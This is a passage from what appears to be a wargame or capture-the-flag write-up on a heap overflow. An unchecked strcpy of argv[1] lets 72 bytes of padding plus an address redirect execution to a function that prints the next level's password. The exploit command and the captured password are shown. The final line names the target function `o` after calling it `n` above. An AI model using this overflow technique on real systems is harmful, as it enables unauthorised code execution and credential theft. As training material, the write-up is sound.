...
```
- Then a strcpy is called on the first malloced buffer, copying the first cli argument (argv[1]) into the buffer
- strcpy is vulnerable on user input source, since it doesn't check the size of the destination buffer nor of the source buffer
...
```
the function `n` calls `system("/bin/cat /home/user/level7/.pass")`, its our new target to execute : 0x08048454

```
~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
After writing 72 bytes, we write the address of `o` (0x08048454)
